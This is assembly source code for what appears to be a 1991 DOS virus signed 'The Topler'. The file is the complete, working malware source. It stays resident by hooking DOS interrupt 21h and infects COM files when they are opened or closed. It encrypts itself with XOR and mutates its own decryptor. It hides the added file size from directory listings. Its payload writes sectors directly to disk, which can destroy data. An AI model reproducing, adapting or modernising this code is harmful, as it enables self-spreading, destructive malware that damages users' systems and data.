code               segment
                   assume cs:code
                   org  100h

start:
                   jmp  begin

                   org  200h
begin:
                   jmp  short beg

FileSize           dw   0E00h; 02h
int21vec           dd   0    ; 04h
oldint13           dd   0    ; 08h
oldint24           dd   0    ; 0Ch
Date               dw   0    ; 10h
Time               dw   0    ; 12h
                   db   1    ; 14h
version            dw   0    ; 15h   - mutation status

beg:
                   call codenext
codenext:
                   pop  si
mutation1:
                   cli
                   push ds
                   pop  es
                   mov  bp,sp
                   mov  sp,si
                   add  sp,3FEh-(offset codenext-offset begin)
mutation2:
                   mov  cx,ss
                   mov  ax,cs
                   mov  ss,ax
                   pop  bx
                   dec  sp
                   dec  sp
                   add  si,offset mybeg-offset codenext
codeloop:
                   pop  ax
                   xor  al,bh
                   push ax
                   dec  sp
                   cmp  sp,si
                   jnc  codeloop
mybeg:
                   mov  ax,es
                   dec  ax
                   mov  ds,ax
                   add  word ptr ds:[3],-082h
                   mov  bx,ds:[3]
                   mov  byte ptr ds:[0],5ah
                   inc  ax
                   inc  bx
                   add  bx,ax
                   mov  es,bx
                   mov  ss,cx
                   add  si,offset begin-offset mybeg
                   mov  bx,ds
                   mov  ds,ax
                   mov  sp,bp
                   push si
                   xor  di,di
                   mov  cx,400h
                   cld
                   rep  movsb
                   pop  si
                   push bx
                   mov  bx,offset inblock-offset begin
                   push es
                   push bx
                   retf
inblock:
                   mov  es,ax
                   mov  ax,cs:[2]                ; File Size
                   add  ax,100h
                   mov  di,si
                   mov  si,ax
                   mov  cx,400h
                   rep  movsb
                   pop  es
                   xor  ax,ax
                   mov  ds,ax
                   sti
                   cmp  word ptr ds:[21h*4],offset int21-offset begin
                   jne  count
                   sub  word ptr es:[3],-082h
                   test byte ptr ds:[46ch],11100111b
                   jnz  efect1
                   push cs
                   pop  ds
                   mov  si,offset msg-offset begin
efect2:
                   lodsb
                   or   al,0
                   jz   efect3
                   mov  ah,0eh
                   int  10h
                   jmp  short efect2
efect3:
                   mov  ah,32h
                   xor  dl,dl
                   int  21h
                   jc   efect1
                   call setaddr
                   call setint
                   mov  dx,ds:[bx+10h]
                   mov  ah,19h
                   int  21h
                   mov  cx,2
                   int  26h
                   pop  bx
                   call setint
efect1:
                   jmp  quit
count:
                   add  word ptr es:[12h],-082h
                   mov  bx,ds:[46ch]
                   push ds
                   push cs
                   pop  ds
                   push cs
                   pop  es
                   mov  byte ptr ds:[14h],1
                   and  bh,80h
                   mov  ds:[4ffh],bh
                   test bl,00000001b
                   jnz  mut1
                   mov  si,offset mutation1-offset begin
                   add  si,ds:[15h]
                   lodsb
                   xchg al,ds:[si]
                   mov  ds:[si-1],al
mut1:
                   test bl,00000010b
                   jnz  mut2
                   mov  si,offset mutation2-offset begin
                   add  si,ds:[15h]
                   lodsw
                   xchg ax,ds:[si]
                   mov  ds:[si-2],ax
mut2:
                   test bl,00000100b
                   jnz  mut3
                   mov  si,offset codeloop-offset begin
                   mov  al,2
                   xor  byte ptr ds:[si],al
                   xor  byte ptr ds:[si+2],al
                   xor  byte ptr ds:[si+3],al
mut3:
                   test bl,00001000b
                   jnz  mut4
                   mov  si,offset codenext-offset begin
                   mov  di,400h
                   mov  cx,offset codeloop-offset codenext-2
                   push si
                   push di
                   lodsb
                   cmp  al,5eh
                   je   jmp1
                   inc  si
jmp1:
                   push cx
                   rep  movsb
                   pop  cx
                   pop  si
                   pop  di
                   cmp  al,5eh
                   je   jmp2
                   mov  al,5Eh
                   stosb
                   rep  movsb
                   mov  al,90h
                   stosb
                   xor  ax,ax
                   jmp  short jmp3
jmp2:
                   mov  ax,0C68Fh
                   stosw
                   rep  movsb
                   mov  ax,1
jmp3:
                   mov  cs:[15h],ax
mut4:
                   mov  ah,30h
                   int  21h
                   cmp  ax,1e03h
                   jne  nodos33
                   mov  ah,34h
                   int  21h
                   mov  bx,1460h
                   jmp  short dos33
nodos33:
                   mov  ax,3521h
                   int  21h
dos33:
                   mov  ds:[4],bx
                   mov  ds:[6],es
                   mov  si,21h*4
                   pop  ds
                   push si
                   push cs
                   pop  es
                   mov  di,offset intend-offset begin+1
                   movsw
                   movsw
                   pop  di
                   push ds
                   pop  es
                   mov  ax,offset int21-offset begin
                   stosw
                   mov  ax,cs
                   stosw
                   mov  di,offset mybeg-offset begin
                   mov  al,cs:[3ffh]
coderloop:
                   xor  cs:[di],al
                   inc  di
                   cmp  di,offset coderloop-offset begin
                   jc   coderloop
quit:
                   mov  ah,62h
                   int  21h
                   push bx
                   mov  ds,bx
                   mov  es,bx
                   mov  ax,100h
                   push ax
                   retf
;------------------------------------------------------------------------------
infect:
                   push si
                   push ds
                   push es
                   push di
                   cld
                   push cs
                   pop  ds
                   xor  dx,dx
                   call movefp
                   mov  dx,400h
                   mov  ah,3fh
                   mov  cx,3
                   call Dos
                   jc   infect4
                   xor  di,di
                   mov  ax,word ptr ds:[400h]
                   mov  cx,ds:[0]
                   cmp  cx,ax
                   je   infect8
                   cmp  al,0EBH  ; near jmp
                   jne  infect1
                   mov  al,ah
                   xor  ah,ah
                   add  ax,2
                   mov  di,ax
infect1:
                   cmp  al,0E9h  ; far jmp
                   jne  infect2
                   mov  ax,ds:[401h]
                   add  ax,3
                   mov  di,ax
                   xor  ax,ax
infect2:
                   cmp  ax,'MZ'
                   je   infect4
                   cmp  ax,'ZM'
                   jne  infect3
infect4:
                   stc
infect8:
                   jmp  infectquit
infect3:
                   mov  dx,di
                   push cx
                   call movefp
                   mov  dx,400h
                   mov  ah,3fh
                   mov  cx,dx
                   call Dos
                   pop  cx
                   jc   infect4
                   cmp  ds:[400h],cx
                   je   infect8
                   mov  ax,di
                   sub  ah,-4
                   cmp  ax,ds:[2]
                   jnc  infect4
                   mov  dx,ds:[2]
                   call movefp
                   mov  dx,400h
                   mov  cx,dx
                   mov  ah,40h
                   call Dos
infect6:
                   jc   infectquit
                   mov  dx,di
                   call movefp
                   push cs
                   pop  es
                   mov  di,400h
                   push di
                   push di
                   xor  si,si
                   mov  cx,di
                   rep  movsb
                   mov  si,400h+offset coderloop-offset begin
                   mov  al,ds:[7ffh]
infect5:
                   xor  ds:[si],al
                   inc  si
                   cmp  si,07ffh
                   jc   infect5
                   pop  cx
                   pop  dx
                   mov  ah,40h
                   call Dos
infectquit:
                   pop  di
                   pop  es
                   pop  ds
                   pop  si
                   ret
int21:
                   cmp  ax,4b00h
                   je   exec
                   cmp  ah,3eh
                   je   close
                   cmp  ah,11h
                   je   dir
                   cmp  ah,12h
                   je   dir
intend:
                   db   0eah,0,0,0,0

dir:
                   push si
                   mov  si,offset intend-offset begin+1
                   pushf
                   call dword ptr cs:[si]
                   pop  si
                   push ax
                   push bx
                   push es
                   mov  ah,2fh
                   call dos
                   cmp  byte ptr es:[bx],0ffh
                   jne  dir2
                   add  bx,7
dir2:
                   mov  ax,es:[bx+17h]
                   and  ax,1fh
                   cmp  ax,1eh
                   jne  dir1
                   mov  ax,es:[bx+1dh]
                   cmp  ax,0801h
                   jc   dir1
                   sub  ax,400h
                   mov  es:[bx+1dh],ax
dir1:
                   pop  es
                   pop  bx
                   pop  ax
                   iret
int24:
                   mov  al,3
                   iret
Dos:
                   pushf
                   call dword ptr cs:[4]
                   ret
moveFP:
                   xor  cx,cx
                   mov  ax,4200h
                   call Dos
                   ret
exec:
                   push ax
                   push bx
                   mov  byte ptr cs:[14h],0
                   mov  ax,3d00h
                   call dos
                   mov  bx,ax
                   mov  ah,3eh
                   int  21h
                   pop  bx
                   pop  ax
intendjmp:
                   jmp  short intend
close:
                   or   byte ptr cs:[14h],0
                   jnz  intendjmp
                   push cx
                   push dx
                   push di
                   push es
                   push ax
                   push bx
                   call setaddr
                   call setint
                   mov  ax,1220h
                   int  2fh
                   jc   closequit
                   mov  ax,1216h
                   mov  bl,es:[di]
                   xor  bh,bh
                   int  2fh
                   mov  ax,es:[di+11h]
                   mov  cs:[2],ax
                   mov  ax,es:[di+0dh]
                   and  al,0f8h
                   mov  cs:[12h],ax
                   mov  ax,es:[di+0fh]
                   mov  cs:[10h],ax
                   cmp  word ptr es:[di+29h],'MO'
                   jne  closequit
                   cmp  byte ptr es:[di+28h],'C'
                   jne  closequit
                   cmp  cs:[2],0FA00h
                   jnc  closequit
                   mov  al,20h
                   xchg al,es:[di+4]
                   mov  ah,2
                   xchg es:[di+2],ah
                   pop  bx
                   push bx
                   push ax
                   call infect
                   pop  ax
                   mov  es:[di+4],al
                   mov  es:[di+2],ah
                   mov  cx,cs:[12h]
                   jc   close1
                   or   cl,1fh
                   and  cl,0feh
close1:
                   mov  dx,cs:[10h]
                   mov  ax,5701h
                   call Dos
closequit:
                   pop  bx
                   pop  ax
                   pop  es
                   pop  di
                   pop  dx
                   pop  cx
                   call dos
                   call setint
                   retf 02
setaddr:
                   mov  ah,13h
                   int  2fh
                   mov  cs:[8d],bx
                   mov  cs:[10d],es
                   int  2fh
                   mov  cs:[12d],offset int24-offset begin
                   mov  cs:[14d],cs
                   ret
setint:
                   push ax
                   push si
                   push ds
                   pushf
                   cli
                   cld
                   xor  ax,ax
                   mov  ds,ax
                   mov  si,13h*4
                   lodsw
                   xchg ax,cs:[8]
                   mov  ds:[si-2],ax
                   lodsw
                   xchg ax,cs:[10d]
                   mov  ds:[si-2],ax
                   mov  si,24h*4
                   lodsw
                   xchg ax,cs:[12d]
                   mov  ds:[si-2],ax
                   lodsw
                   xchg ax,cs:[14d]
                   mov  ds:[si-2],ax
                   popf
                   pop  ds
                   pop  si
                   pop  ax
                   ret
msg:
                   db   'The leech live ...',0
                   db   'April 1991  The Topler.',0

                   org  0F00h

                   int  20h

code               ends
                   end  start
